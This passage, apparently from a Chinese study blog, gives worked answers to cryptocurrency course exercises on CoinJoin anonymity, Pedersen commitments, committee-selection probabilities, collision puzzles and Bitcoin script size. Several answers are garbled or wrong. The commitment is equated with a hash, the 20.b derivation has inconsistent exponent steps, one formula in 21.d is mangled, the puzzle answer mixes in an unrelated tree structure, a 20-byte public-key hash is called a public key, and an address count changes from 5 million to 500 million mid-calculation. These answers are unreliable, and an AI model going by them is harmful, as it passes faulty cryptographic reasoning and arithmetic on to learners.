inline">\({\color{CornflowerBlue}(3)}\)</span>也由Alice控制。</p><p>如此因为交易<spanclass="math inline">\({\color{CornflowerBlue}(3)}\)</span>由Alice控制,那么交易<spanclass="math inline">\({\color{CornflowerBlue}(3)}\)</span>输入的找零交易一定也是找零给Alice自己。</p><p>我们知道交易的输入应该来自同一个人, 那么显然由Bob控制交易<spanclass="math inline">\((1)\)</span>支付了一笔钱给Alice,并且获得一部分找零退回给了Bob自己。</p></blockquote><p><strong>19.c</strong>: 观察者能否确定谁支付了Carol <spanclass="math inline">\((C)\)</span>?解释如何或解释为什么不能确定地确定她的身份。如果无法识别,请描述该支付者拥有的匿名集。</p><blockquote><p>目前还完全不明确是谁控制了<code>3-to-3</code>的混合交易的输入,我们只知道输入分别来自于Alice &amp;Bob。并且我们也不知道<code>3-to-3</code>混合交易的输出是支付给Bob, Alice或是其他人 (Unknown)。</p><p>所以我们根本无法得知向Carlo <spanclass="math inline">\((C)\)</span>支付了费用的那笔交易的控制者是谁。</p><p>所以, 该付款人的匿名集为: <span class="math inline">\(\{Alice, Bob,unknown\}\)</span>。</p></blockquote><h2 id="confidential-transactions-保密交易">20.Confidential Transactions保密交易</h2><p>回想一下, 在机密交易中, 每个输入/输出值 <spanclass="math inline">\(({\color{cornflowerblue}{x_i}})\)</span> 都使用<strong>Pedersen Commitment 佩德森承诺</strong> 表示: <spanclass="math inline">\(C_{i} = g^{ {\color{cornflowerblue}{x_i}}}h^{r_i}\)</span>。 其中<span class="math inline">\(c_i, g \ \And \h\)</span> 都是<strong>Finite Cyclic group 有限循环群</strong>: <spanclass="math inline">\(\mathbb{G}\)</span>中的元素 (例如整数群 mod一些素数<span class="math inline">\((q)\)</span>, 或者<u>Elliptic CurvePoints 椭圆曲线上的点</u>)。 假设<spanclass="math inline">\(\mathbb{G}\)</span>: 是已知顺序的 <u>prime质数</u> (<span class="math inline">\(q\)</span>), 并且<spanclass="math inline">\(g, h\)</span>都是<spanclass="math inline">\(\mathbb{G}\)</span>的生成器。该方案的安全性依赖于<span class="math inline">\(\log_{g}(h)\)</span>,即以<span class="math inline">\(h\)</span>的以<spanclass="math inline">\(g\)</span>为底数的<u>discrete logarithm离散对数</u>是未知的。 需要注意, 在<strong>Finite Cyclic group有限循环群</strong>中知道: <spanclass="math inline">\(\log_{g}(h)\)</span>等同于知道了<spanclass="math inline">\(\log_{h}(g)\)</span> 回想一下, 该方案的<u>BindingProperty 绑定属性</u>表明, 给定一个值 <spanclass="math inline">\(c_i\)</span> , 应该至多有一个已知的开口 (例如,一个满足上述方程的<span class="math inline">\(x_i\)</span>或<spanclass="math inline">\(r_i\)</span>的值)。</p><p><strong>20.a</strong>: 证明, 给定的Pedersen Commitment: <spanclass="math inline">\(c = g^{x}h^{r}\)</span>, 如果能够找到其他的<spanclass="math inline">\({ {x}{\prime{}}, {r}{\prime}}\)</span> 使得: <spanclass="math inline">\(c = g^{ {x}{\prime{}}} h^{ {r}{\prime{}}}\)</span>, 就同样可以计算出 <spanclass="math inline">\(\log_{g}{h}\)</span></p><blockquote><p>首先<span class="math inline">\(Commitment = H(x || r)\)</span>,其中<span class="math inline">\(r\)</span>为<u>nonce随机数</u>并具有高<em>Entropy 墒</em>, 所以保证了<spanclass="math inline">\(x\)</span>的<em>blinding 不可判断性</em>。</p><p>如上文提到的<spanclass="math inline">\(\mathbb{G}\)</span>包含一组prime素数<spanclass="math inline">\(q\)</span>: <spanclass="math inline">\(\mathbb{G}=\{0,1,...q-1\}\)</span></p><p><span class="math inline">\(\mathbb{G}\)</span>群中的所有的素数<spanclass="math inline">\((q)\)</span>都是已知顺序的, 并可以通过<spanclass="math inline">\(g, h\)</span>生成, 所以我们有:</p><ol type="1"><li><span class="math inline">\(\{g, g^{2}, g^{3}, \dots,g^{q}\}\)</span></li><li><span class="math inline">\(\{h, h^2, h^3, \dots,h^{p}\}\)</span></li></ol><p>我们知道<spanclass="math inline">\(\mathbb{G}\)</span>群中的元素需要mod素数<spanclass="math inline">\(q\)</span>那么我们有:</p><ol type="1"><li><span class="math inline">\(\mathbb{G} = \{(g\mod{q}), (g^{2}\mod{q}), (g^{3}\mod{q}), \dots, (g^{q}\mod{q})\}\)</span></li><li><span class="math inline">\(\mathbb{G} = \{(h\mod{q}), (g^{2}\mod{q}), (g^{3}\mod{q}), \dots, (g^{q}\mod{q})\}\)</span></li></ol><p>如下图所示: 由于我们知道<strong>Finite Cyclic group有限循环群</strong>按照<spanclass="math inline">\(\mathbb{G}=\{0,1,...q-1\}\)</span>的顺序,并且最终<span class="math inline">\(q = 0\)</span>。</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206041805546.svg" alt="cc_Finite_Cyclic_Group_sol" style="zoom:50%;" /></p><p>因为<span class="math inline">\(\{g, (g*g), (g*g*g), \dots,g^{q}\}\)</span>所以我们只需要考虑<span class="math inline">\((幂\mod{q})\)</span>:</p><ul><li><span class="math inline">\(\{1 \mod{q}, 2^ \mod{q}, 3 \mod{q},\dots, q\mod{q}\}\)</span></li></ul><p>另外基于一些常识:</p><ul><li><span class="math inline">\((g^a)^m = g^{am}\)</span></li><li><span class="math inline">\(g^{-a} = (g^{-1})^a =(g^{a})^{-1}\)</span></li><li><span class="math inline">\(g^{\frac{1}{a}} = g^{(a^{-1})}\)</span><ul><li>同上我们只考虑<span class="math inline">\((幂\mod{q})\)</span>:</li><li><span class="math inline">\(({a^{-1}}\mod{q}) = (a*a^{-1} \mod{q})\\ = \frac{a}{1}*\frac{1}{a} \mod{q} \\ = \ {1}\mod{q}\)</span></li><li>由于 <span class="math inline">\(q\)</span> 是素数, 所以只有在<spanclass="math inline">\(a \neq 0\)</span>的前提下, <spanclass="math inline">\(a\mod{q} \neq 0\)</span></li></ul></li><li><strong>Extended Euclidean Algorithm 扩展欧几里得算法(辗转相除法)</strong><ul><li>即找到<span class="math inline">\(x,y\)</span>使得: <spanclass="math inline">\(ax + by = \gcd{(a,b)}\)</span></li></ul></li></ul><p>那么回答本题: 如果找到$ {x}{}, {r}{} $使得: <spanclass="math inline">\(c = g^{x}h^{r} = g^{ {x}{\prime{}}}h^{{r}{\prime{}} }\)</span>, 那么通过:</p><ul><li><span class="math inline">\(c = g^{x}h^{r} = g^{ {x}{\prime{}}}h^{{r}{\prime{}} } \\ h^{r- {r}{\prime{}} } = g^{ {x}{\prime{}}-x} \\ h =g^{( {x}{\prime{}}-x)(r- {r}{\prime{}} )^{ {\color{red}{-1}}}}\)</span></li></ul><p>我们可以得到:</p><ul><li><span class="math inline">\(\log_{g}(h) =({x}{\prime{}}-x)(r-{r}\prime) \in \mathbb{F}_q\)</span><ul><li><span class="math inline">\(\mathbb{F}_q\)</span>: <u>Finite Fieldof <span class="math inline">\(q\)</span> Element</u>表示乘法, 除法,减法都要执行<span class="math inline">\(\mod{q}\)</span></li></ul></li></ul></blockquote><p>实际<strong>保密交易</strong>依赖于稍微不同的属性。回顾一下,证明<span class="math inline">\(SUM(Input_{committed}) =SUM(Output_{committed})\)</span>需要一个额外的条件例如一笔<code>2-to-2</code>两进两出的混合的交易, 给定:</p><ul><li>输入: <span class="math inline">\(c_{1}c_{2}\)</span></li><li>输出: <span class="math inline">\(c_{3}c_{4}\)</span></li><li>需要额外提供随机的<em>blinding factor 致盲因子</em>: <spanclass="math inline">\(r_5\)</span>, 使得<spanclass="math inline">\(c_{1}c_{2} = c_{3}c_{4}{\color{red}{h^{r_{5}}}}\)</span><ul><li>这样才能证明: <span class="math inline">\(x_{1}+x_{2} = x_{3}+x_{4}\ [\mod{q}]\)</span>, 由于需要证明交易是Square:<ul><li>需要提供<strong>Zero-Knowledge Range Proofs零知识范围证明</strong>以证明: 对于某个 <spanclass="math inline">\(x\)</span> 允许的最大值: (<spanclass="math inline">\(x_{max}\)</span>) 而言, 每个 <spanclass="math inline">\(x_i\)</span> 都远小于其对应的素数(<spanclass="math inline">\(q\)</span>): <span class="math inline">\(0 \leqx_i \leq x_{max} \ll q\)</span></li><li>这个允许的最大值的例子可以是: (<span class="math inline">\(x_{max} =全部货币供应量\)</span>)</li><li>这将可以保证: <span class="math inline">\(x_i\)</span>经过 <spanclass="math inline">\(\mod{q}\)</span> 后都不会超过溢出<spanclass="math inline">\(m_{max}\)</span></li><li>添加这个 ZKRP 主要是对输出进行防溢出, 因为是环状的,所以要防止通过溢出的值使得输等于输入的等式成立。</li></ul></li><li>该值可以通过: <span class="math inline">\(r^{5}=(r_{1}+r_{2})-(r_{3}+r_{4}) \ [\mod{q}]\)</span></li></ul></li></ul><p><strong>20.b</strong>: 假设攻击者知道对于<spanclass="math inline">\(z\)</span>值的<spanclass="math inline">\(h=g^{z}\)</span>. 攻击者在知道任意<spanclass="math inline">\(c_{1},c_{2},c_{3},c_{4}\)</span>以及所有<spanclass="math inline">\(x,r\)</span>值的情况下, 可以计算出满足等式的<spanclass="math inline">\(r_5\)</span>。这样攻击者可以创建一笔交易来增加或减少交易货币供应量。</p><blockquote><p>根据: <spanclass="math inline">\(C_{i}=g^{x_{i}}h^{r_{i}}\)</span>:</p><ul><li><span class="math inline">\(c_{1}c_{2} = c_{3}c_{4}{\color{red}{h^{r_{5}}}}\)</span> 可以写作:</li><li><span class="math inline">\(g^{x_1}h^{r_1} \ g^{x_2}h^{r_2} =g^{x_2}h^{r_2} \ g^{x_4}h^{r_4} \ {\color{red}{h^{r_{5}}}}\)</span></li></ul><p>根据<span class="math inline">\(h=g^{z}\)</span>我们可以推导出:</p><ul><li><span class="math inline">\(g^{x_1+x_2}h^{r_1+r_2} =g^{x_3+x_4}h^{r_3+r_4+{\color{red}{r_5}}}\)</span></li><li><span class="math inline">\(g^{x_1 + x_2 + z(r_1+r_2)} =g^{x_3+x_4+z(r_3+r_4+{\color{red}{r_5}})}\)</span></li><li><span class="math inline">\(g^{z \ {\color{red}{r_5}}} =g^{x_1+x_2-x_3-x_4+z^{-1}(r_1+r_2+r_3+r_4)}\)</span></li><li><span class="math inline">\(g^{ {\color{red}{r_5}} } =g^{r_1+r_2-r_3-r_4+z^{-1}(x_1+x_2-x_3-x_4)}\)</span></li><li><span class="math inline">\({\color{red}{r_5}} =r_1+r_2-r_3-r_4+z^{-1}(x_1+x_2-x_3-x_4) \in \mathbb{F}_q\)</span></li></ul></blockquote><p><strong>20.c</strong>: 假设有一笔交易即使在: <spanclass="math inline">\(x_{1}+x_{2} {\color{red}\neq} x_{3}+x_{4} \[\mod{q}]\)</span> 的前提下, 仍然可以满足: <spanclass="math inline">\(c_{1}c_{2} = c_{3}c_{4}{\color{red}{h^{r_{5}}}}\)</span>。 那么同上在知道所有 <spanclass="math inline">\(x, r\)</span> 值的条件下, 证明您可以计算出: <spanclass="math inline">\(\log_{g} (h)\)</span></p><blockquote><ul><li><span class="math inline">\(g^{x_1+x_2}h^{r_1+r_2} = g^{x_3+x_4}h^{r_3+r_4+{\color{red}{r_5}}}\)</span></li><li><span class="math inline">\(h^{r_1+r_2-r_3-r_4-{\color{red}{r_5}}} =g^{x_3+x_4-x_1-x_2}\)</span></li><li><span class="math inline">\(h =g^{(x_3+x_4-x_1-x_2)(r_1+r_2-r_3-r_4-{\color{red}{r_5}})^{{\color{red}-1}} }\)</span></li></ul><p>所以我们可以得到: <span class="math inline">\(\log_{g}(h) =(x_3+x_4-x_1-x_2)(r_1+r_2-r_3-r_4-{\color{red}{r_5}})^{ {\color{red}-1}} \in \mathbb{F}_q\)</span></p><p>那么只要我们能公计算出 <spanclass="math inline">\(\log_{g}(h)\)</span>, 即便 <spanclass="math inline">\(x_{1}+x_{2} {\color{red}\neq} x_{3}+x_{4} \[\mod{q}]\)</span> 我们也能计算出有效的: <spanclass="math inline">\({\color{red}{h^{r_{5}}}}\)</span></p></blockquote><p>最后我们回顾上述<strong>20.b</strong>&amp;<strong>20.c</strong>可以得出结论:保密交易的安全性相当于<u>Discrete Logarithm Problem 离散对数问题(DLP)</u></p><p>通过<strong>20.b</strong>我们总结: 如果知道 DLP 的解,攻击者能够使总输出值不等于总输入值 (<spanclass="math inline">\(SUM(Input_{committed}) {\color{red}\neq}SUM(Output_{committed})\)</span>) 的交易合法化。</p><p>通过<strong>20.c</strong>我们总结: 与<strong>20.b</strong>相反的情况,攻击者能够利用无效交易的有效证明允许我们找到DLP问题的解。所以保密交易的安全性问题等同于DLP问题。</p><h2id="pseudorandom-committee-selection-伪随机的委员会选择">21.PseudorandomCommittee Selection 伪随机的委员会选择</h2><p>许多有效的分布式共识协议依赖于抽样少数用户成为某一轮或一组轮（称为一个Epoch时期）的委员会成员。一个重要的安全目标是,对手不太可能控制足够多数的选定委员会在任何 round 轮次/ epoch时代进行攻击。</p><p>假设:</p><ul><li>(<span class="math inline">\(N\)</span>) 名参与者组成</li><li>corrupt node 腐败节点 (<span class="math inline">\(f\)</span>)不超过 【可以容忍度】</li><li>系统中所有用户中有 (<span class="math inline">\(h\)</span>)是诚实的（不腐败）</li><li>选择具有超过 (<span class="math inline">\(f\)</span>)个损坏节点的委员会的概率最多为 <spanclass="math inline">\(2^{-\lambda}\)</span></li></ul><p><strong>21.a</strong>: 写出一个数学方程,</p><blockquote><p>需要<strong>Binomial Distribution 二项分布</strong>:</p><p><span class="math inline">\(f(k,n,p) = Pr(X=k) \\ {n\choose{k}} =\frac{n!}{k!(n-k)!}\)</span></p><p>这里<span class="math inline">\(k\)</span>为诚实用户的个数, <spanclass="math inline">\(n\)</span>为委员会成员的总数 (<spanclass="math inline">\(N\)</span>), <spanclass="math inline">\(p\)</span>为每个成员为诚实的概率(<spanclass="math inline">\(p = h\)</span>)</p><p>所以通过二项分布公式可以计算出, 每一个用户是诚实的的概率。</p><p><span class="math inline">\(Pr(k; N, h) = {N \choose k} h^k(1-h)^{N-k}\)</span></p><p>即: <span class="math inline">\(Pr(诚实用户数; 总用户数,用户为诚实的概率) = { {总用户数} \choose {诚实用户数} }用户为诚实的概率^{诚实用户数}(用户不诚实的概率)^{不诚实用户数}\)</span></p><p>通过总参与者节点(<spanclass="math inline">\(N\)</span>)减去可承受腐败节点(<spanclass="math inline">\(f\)</span>)的个数,得到非腐败节点的个数那么再发布1得到<u>不可承受的腐败数量</u>,然后这个数量需要小于<span class="math inline">\(2^{-\lambda}\)</span> F<span class="math inline">\(\sum^{N-f-1}_{k=0} Pr(k; N, h) =2^{-\lambda}\)</span></p><p>即: <spanclass="math inline">\(\sum_{0个诚实的用户}^{能接受的不诚实用户数的上限(总用户数-可接受不诚实用户数阈值-1)}为诚实用户的概率 = 2^{-\lambda}\)</span></p></blockquote><p><strong>21.b</strong>: 创建一个简单的电子表格（或计算机程序或脚本）,让您可以试验上述值</p><blockquote><p>Calculate in Python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Binomial | Cumulative distribution function (CDF) 累积分布函数 </span></span><br><span class="line"><span class="comment"># 通过 CDF 计算: 不可承受的不诚实用户的数量上限</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> scipy.stats</span><br><span class="line">N = <span class="number">185</span></span><br><span class="line">f = <span class="number">92</span></span><br><span class="line">h = <span class="number">0.8</span></span><br><span class="line">-np.log2(scipy.stats.binom.cdf(N - f - <span class="number">1</span>, N, h))</span><br><span class="line"><span class="comment"># Result</span></span><br><span class="line"><span class="number">64.25226432110163</span></span><br></pre></td></tr></table></figure><p><ahref="https://www.wolframalpha.com/input?i2d=true&amp;i=Sum%5BPDF%5C%2891%29BinomialDistribution%5C%2891%29185%5C%2844%29+0.8%5C%2893%29%5C%2844%29+k%5C%2893%29%2C%7Bk%2C0%2C185-%5C%2840%2992%5C%2841%29-1%7D%5D+%3D+Power%5B2%2C-%5Clambda%5D">Wolframalpha</a></p><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Sum</span><span class="punctuation">[</span><span class="built_in">PDF</span><span class="punctuation">[</span><span class="built_in">BinomialDistribution</span><span class="punctuation">[</span><span class="number">185</span><span class="operator">,</span> <span class="number">0.8</span><span class="punctuation">]</span><span class="operator">,</span> <span class="variable">k</span><span class="punctuation">]</span><span class="operator">,</span><span class="punctuation">&#123;</span><span class="variable">k</span><span class="operator">,</span><span class="number">0</span><span class="operator">,</span><span class="number">185</span><span class="operator">-</span><span class="punctuation">(</span><span class="number">92</span><span class="punctuation">)</span><span class="operator">-</span><span class="number">1</span><span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="operator">=</span> <span class="number">2</span><span class="operator">^-</span>\<span class="variable">lambda</span></span><br></pre></td></tr></table></figure></blockquote><p><strong>21.c</strong>: 如果, 用户诚实度: <spanclass="math inline">\(h = 0.8\)</span></p><p>每个Epoch只要求诚实的用户占主导(50% = <spanclass="math inline">\(\frac{N}{2}\)</span>), 即要求腐败率<spanclass="math inline">\(f &lt; N/2\)</span></p><p>如果安全参数<span class="math inline">\(\lambda = 64\)</span>,那么需要有多少参与者才能满足 腐败率<span class="math inline">\(f &lt;N/2\)</span> 的条件?</p><blockquote><p>计算N需要通过一点一点(暴力算法,或者更快的使用二分法)的尝试去找到正确的N值</p><p><span class="math inline">\(h = 0.8\)</span></p><p><span class="math inline">\(f \lt \frac{N}{2} \lt 92\)</span></p><p><span class="math inline">\(\lambda = 64\)</span></p><p><span class="math inline">\(不可承受的不诚实用户的数量上限 =\sum_{0}^{N-\frac{N}{2}-1}Pr(k; N, 0.8) = 2^{-64} \\ N \approx 185\  \And \lfloor f \rfloor \approx 92\)</span></p><p>至少需要<spanclass="math inline">\(N=185\)</span>个委员会成员才能满足在容错率为<spanclass="math inline">\(2^{-64}\)</span>时只有一半一下<spanclass="math inline">\(f \lt \frac{N}{2}\)</span>的参与者是不诚实的</p></blockquote><p><strong>21.d</strong>: 已知安全参数为<spanclass="math inline">\(64\)</span>和容错率为<spanclass="math inline">\(N/3\)</span>, 求<spanclass="math inline">\(N\)</span></p><blockquote><p><span class="math inline">\(h = 0.8\)</span></p><p><span class="math inline">\(f \lt \frac{N}{3}\)</span></p><p><span class="math inline">\(\lambda = 64\)</span></p><p>$不可承受的不诚实用户的数量上限 = _{0}^{N--1}Pr(k; N, 0.8) = 2^{-64}\ N f $</p><p>可以看出容错率约底, 则需要更多的委员会人数,来保证能选举出足够的诚实成员, 和不超标的恶意成员。</p><p>但是过高的委员会成员(<span class="math inline">\(N\)</span>),会需要消耗更多的带宽 (下一题: 1.e)</p></blockquote><p><strong>21.e</strong>:Algorand中确认委员会在进行confirmatory确认选举区块的阶段,每个成员需要广播自己的确认签名, 如果参与者 (<spanclass="math inline">\(N\)</span>) 太多会有什么不好的影响?</p><blockquote><p>如果<strong>Confirmer 确认者</strong>委员会中的成员(<spanclass="math inline">\(N\)</span>)太多了, 那么由于每个成员(<spanclass="math inline">\(i\)</span>)都需要广播自己的区块确认以及签名给其他成员,会造成过大的<strong>Communication Overhead 通信开销</strong>,从而会消耗大量的带宽。</p></blockquote><p><strong>21.f</strong>: 在 <strong>round-based proof-of-stake (PoS)基于轮次的股权证明协议</strong>中选择更大的 (<spanclass="math inline">\(N\)</span>) 有什么缺点, 在该协议中,每个委员会成员都被分配在一个时期的 N个<strong>Slot插槽</strong>中的一个中产生一个块?</p><blockquote><p>由于在一个Epoch中每个成员会被分配一个Slot去广播一个区块,这样不再发布*Communication Overhead 通信开销<strong>的问题,也就不再发布</strong>Bandwidth 带宽<strong>。 但是Epoch中的链太长了,会增加发生</strong>Adaptive Attack 自适应攻击<strong>的可能性,因为</strong>Attacker 攻击者**将有更多的时间,在当前Epoch的选举结束之前去攻击(控制)被选举成为下一个Epoch成员中的最后一个成员。另外如果选举链太长(选举时间太长)选举过程中候选人可以通过长时间持有(不操作)自己的币,去保证一个更大的权益, 以提高自己被选中成为下一个epoch委员会的成员。</p></blockquote><h2 id="alternate-puzzles-其他谜题">22.Alternate Puzzles 其他谜题</h2><p><span class="math inline">\(H(c,n_1) = H(c, n_2)(\mod{d})\)</span></p><p>哈希函数: <span class="math inline">\(H: \{0,1\}^* → \{1, \dots,2^{256} \}\)</span></p><p>难题: (<span class="math inline">\(c\)</span>)</p><p>难度: (<span class="math inline">\(d\)</span>)</p><p>找到 nonces: $n_1 n_2 $</p><p><strong>22.a</strong>: 对于给定的难度(<spanclass="math inline">\(d\)</span>), 大约需要多少次调用哈希函数(<spanclass="math inline">\(H\)</span>)才能生成 (<spanclass="math inline">\(n_1 = n_2\)</span>) 的<strong>冲突Collision</strong>? 这个标准哈希表需要多少内存?</p><blockquote><p>Hash Table: <span class="math inline">\((d \ {slots})\)</span></p><p>Key: <span class="math inline">\(H(c,n) \mod{d}\)</span></p><p>Value: <span class="math inline">\(n\)</span></p><p>Refer to Week2 Solution → Birthday Problem: <spanclass="math inline">\(\frac{N(N-1)}{2 * 365} = 1\)</span>.</p><p>已知<strong>Number of Invocation 调用次数</strong>: (<spanclass="math inline">\(N\)</span>) &amp; 难度: (<spanclass="math inline">\(d\)</span>)</p><p>我们得到: <span class="math inline">\(\frac{N(N-1)}{2 * d} = 1 \\ N\approx \sqrt{2d}\)</span></p><p>Hash Table 内存需要: <span class="math inline">\(N \in\Theta(\sqrt{d})\)</span></p></blockquote><p>22.b: 考虑一个内存有限的简单算法, 它选择一个随机 nonce <spanclass="math inline">\(n_1\)</span>, 然后重复选择一个随机 nonce <spanclass="math inline">\(n_2\)</span> , 直到找到一个与 <spanclass="math inline">\(n_1\)</span> 冲突的 <spanclass="math inline">\(n_2\)</span> 。该算法在预期中将使用多少次 <spanclass="math inline">\(H\)</span> 调用?</p><p>备注：有一个聪明的常数记忆算法, 可以在与 (A)部分相同的渐近时间内找到解决方案, 但只使用常数记忆。</p><blockquote><p>Merkle Patricia Tree (MPT) 使用Hash Pointer, 不需要FullyAuthenticated Data Structure, 所以只需要使用 <strong>Patricia Trie/RadixTrie 基数树</strong></p><p>求调用哈希函数的次数: (<span class="math inline">\(E\)</span>)</p><p>保持<span class="math inline">\(n_1\)</span>不变,Burte-force搜索<span class="math inline">\(n_2\)</span></p><p>$P_{success} = d^{-1} $</p><p>找到<span class="math inline">\(n_2\)</span>的概率 <spanclass="math inline">\(P(1)\)</span></p><p>没找到<span class="math inline">\(n_2\)</span>的概率 <spanclass="math inline">\(1-P\)</span></p><p><span class="math inline">\(E = P(1) + (1-p)(1+E)d \\ E = \frac{1}{P}= \frac{1}{d^{-1}} = d\)</span></p><p>另外一个更快的方法是<ahref="https://en.wikipedia.org/wiki/Cycle_detection#Floyd&#39;s_tortoise_and_hare">Floyd'stortoise and hare algorithm 弗洛伊德的龟兔赛跑算法</a>,快慢指针用于检测集合中是否存在环路, 因为兔子的速度是乌龟的2倍,如果存在闭环则快指针会与慢指针重合, 需要<spanclass="math inline">\(\sqrt{d}\)</span>次调用。</p><p>使用Radix Trie, 使用更少的内存, 但是需要<spanclass="math inline">\(d\)</span>次调用哈希函数去找到<spanclass="math inline">\(n_1 = n_2\)</span></p></blockquote><p><strong>22.c</strong>: 如果对于所有 <spanclass="math inline">\(h,k\)</span>（其中 <span class="math inline">\(h*k\lt B\)</span> 对于某个大边界 <span class="math inline">\(B\)</span>）,在计算 <span class="math inline">\(h * k\)</span>哈希后找到解决方案的概率是在计算后找到解决方案的概率的<spanclass="math inline">\(k\)</span>倍, 则Puzzle是无进度的<spanclass="math inline">\(h\)</span>哈希。这个Puzzle 谜题 时 progress-free无进展的么?</p><blockquote><p>如果使用2.a中的哈希函数, 那么随着投入时间的增加, 找到的概率提高,所以不是无进展的</p><p>It is not progress-free, Probability ↑ with amount of time ↑</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206041946019.svg" alt="Birthday_Paradox" style="zoom:30%;" /></p></blockquote><h2 id="address-compaction-地址压缩">23.Address Compaction 地址压缩</h2><p><strong>23.a</strong>: 比特币中的<u>Public Key公钥</u>严重消耗系统带宽。目前 <strong>Pay-to-Pubkey-Hash(P2PKH)</strong> 是最常见的类型,并且在每个使用P2PK2的赎回交易中都包含<u>Public Key公钥</u>。计算机科学家讨厌重复数据, 倾向于喜欢<u>Layers ofIndirection</u>。因此提出了以下建议：为什么不在列表中存储所有比特币公钥,并通过公钥第一次被使用的顺序为每个公钥分配一个序列号?这将通过仅指定公钥的序列号而不是整个公钥, 来缩短交易长度。这种(可选的)新格式将注册一个新公钥, 如下所示： <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;pubKey&gt;</span><br><span class="line">OP_REGISTER_KEY</span><br></pre></td></tr></table></figure> 新的OP_REGISTER_KEY操作码将获取堆栈上的顶部值并将其存储在全局键查找表中（也将其留在堆栈中）。后续交易可以使用相同的公钥,例如： <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;keyIndex&gt;</span><br><span class="line">OP_LOOKUP_KEY</span><br></pre></td></tr></table></figure></p><p>新的 <code>OP_LOOKUP_KEY</code> 操作码将弹出栈顶的值,并在全局键表中查找它, 并将结果压入栈中。 假设键查找索引为 <spanclass="math inline">\(6\)</span> bytes。</p><p><strong>23.a</strong>: 对于标准的<code>P2PKH</code>交易<u>输出</u>,将资金发送到以前使用过的<u>Public Key 公钥</u>的交易将节省多少字节?对于标准的<code>P2PKH</code>交易<u>输入</u>, 使用以前使用过的公<u>PublicKey 公钥</u>进行花钱的交易将节省多少字节?</p><blockquote><p>首先回顾标准的<code>P2PKH</code>的输入脚本(<code>scriptSig</code>),以及输出脚本 (<code>scriptPubKey</code>):</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">--- 输入脚本 scriptSig: </span><br><span class="line">&lt;sig&gt; </span><br><span class="line">&lt;pubKey&gt;</span><br><span class="line">--- 输出脚本 scriptPubKey: </span><br><span class="line">OP_DUP</span><br><span class="line">OP_HASH160</span><br><span class="line">&lt;pubKeyHash&gt;</span><br><span class="line">OP_EQUALVERIFY</span><br><span class="line">OP_CHECKSIG</span><br></pre></td></tr></table></figure><p>其次回顾`P2PKH中各个元素所占空间大小:</p><table><thead><tr class="header"><th>scriptSig</th><th>107 bytes</th></tr></thead><tbody><tr class="odd"><td><code>&lt;sig&gt;</code></td><td>72 bytes</td></tr><tr class="even"><td><code>&lt;pubKey&gt;</code></td><td>33 bytes</td></tr><tr class="odd"><td>encode操作符(压栈)</td><td>2 bytes</td></tr></tbody></table><table><thead><tr class="header"><th>scriptPubKey</th><th>25 bytes</th></tr></thead><tbody><tr class="odd"><td><code>OP_DUP</code></td><td>1 bytes</td></tr><tr class="even"><td><code>OP_HASH160</code></td><td>1 bytes</td></tr><tr class="odd"><td><code>&lt;pubKeyHash&gt;</code></td><td>20 bytes</td></tr><tr class="even"><td><code>OP_EQUALVERIFY</code></td><td>1 bytes</td></tr><tr class="odd"><td><code>OP_CHECKSIG</code></td><td>1 bytes</td></tr><tr class="even"><td>encode操作符(压栈)</td><td>1 bytes</td></tr></tbody></table><p>然后采用全局键索引表的新脚本: <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">--- 输入脚本 scriptSig: </span><br><span class="line">&lt;sig&gt;</span><br><span class="line">&lt;pubKey&gt;</span><br><span class="line">--- 输出脚本 scriptPubKey: </span><br><span class="line">&lt;keyIndex&gt;</span><br><span class="line">OP_LOOKUP_KEY</span><br><span class="line">OP_CHECKSIG</span><br></pre></td></tr></table></figure></p><table><thead><tr class="header"><th>scriptSig</th><th>107 bytes</th></tr></thead><tbody><tr class="odd"><td><code>&lt;sig&gt;</code></td><td>72 bytes</td></tr></tbody></table><table><thead><tr class="header"><th>scriptPubKey</th><th>25 bytes</th></tr></thead><tbody><tr class="odd"><td><code>&lt;keyIndex&gt;</code></td><td>6 bytes</td></tr><tr class="even"><td><code>OP_LOOKUP_KEY</code></td><td>1 bytes</td></tr><tr class="odd"><td><code>OP_CHECKSIG</code></td><td>1 bytes</td></tr></tbody></table><p>对于<u>输入脚本</u>: 使用键索引后, 兑换交易不再发布提供<u>Public Key公钥</u>, 所以节省了33 bytes。</p><p>对于<u>输出脚本</u>: 使用键索引后, 用 6 bytes 的索引替代了 20 bytes的<u>Public Key 公钥</u>,并且减少了两个<code>OP_CODE</code>操作符(<code>OP_CODE</code>均为1bytes), 那么总共节省了16 bytes。</p></blockquote><p><strong>23.b</strong>: 一个 6 bytes 的键索引足够么?鉴于在第一个10年中创建了大约 5M 个独特的比特币地址,您预计在当前趋势下这种 6 bytes 的键索引能坚持多久?你认为它在未来会安全吗?</p><blockquote><p>已知键索引长度为 <span class="math inline">\(6 \ bytes = 48 \bits\)</span>, 那么将有 <span class="math inline">\(2^{48}\)</span>个键索引可用。我们又知道个目前的被索引占有速度是10年消耗5亿个比特币地址,也就是20年消耗10亿个比特币, 也就是大概 <spanclass="math inline">\(2^{30}\)</span>个键索引将在20年内耗尽。那么我们可以计算 <span class="math inline">\(2^{48}\)</span>个键索引将在: <span class="math inline">\(\frac{2^{48}}{2^{30}}*20 =20(2^{48-30}) = 5,242,880\)</span> 也就是大概需要, 5百多万年才能耗尽。虽然从结果来看, <span class="math inline">\(2^{48}\)</span> 确实足够了。但这其实并不准确, 因为我们还要考虑到真实情况的上限。 目前全球有 <spanclass="math inline">\(2^{33}\)</span> 个人,如果我们假设每个人每天都生成1个地址, 那么需要: <spanclass="math inline">\(\frac{2^{48}}{2^{33}} / 365 = 89.775\)</span>,也就是大概在 <span class="math inline">\(90\)</span> 年内就会耗尽。所以有必要将键索引长增加到 <span class="math inline">\(8 \bytes\)</span> 或以上。</p></blockquote><p><strong>23.c</strong>: 解释这种方法可能的缺点。量化这种方法对验证者的额外成本, 并解释可能对系统进行的新攻击。</p><blockquote><p><strong>缺点</strong>: 如果<u>Public Key 